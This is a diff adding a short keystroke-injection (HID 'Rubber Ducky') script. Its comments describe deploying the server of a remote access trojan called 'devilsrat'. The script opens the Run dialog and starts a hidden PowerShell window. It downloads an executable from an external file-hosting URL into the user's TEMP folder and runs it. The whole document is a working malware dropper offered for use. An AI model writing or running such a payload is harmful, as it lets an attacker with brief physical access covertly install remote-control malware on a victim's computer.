@@ -1,0 +1,15 @@
+REM start of script
+REM must make upload of server from devilsrat client included in package then edit url and output file destination in string below
+REM let the HID enumerate
+DELAY 2000
+GUI r
+DELAY 200
+REM my best attempt at a elevated powershell instance
+STRING powershell Start-Process powershell -Verb runAs -w h MD "$ENV:USERPROFILE\TEMP"; IWR "https://www.upload.ee/download/15875369/88bf72879dfd1dc67fc7/knoc.exe"  -OUTFILE "$ENV:USERPROFILE\TEMP\2.EXE"; CD $ENV:USERPROFILE\TEMP; SLEEP 5; & .\2.EXE
+ENTER
+
+
+
+
+
+
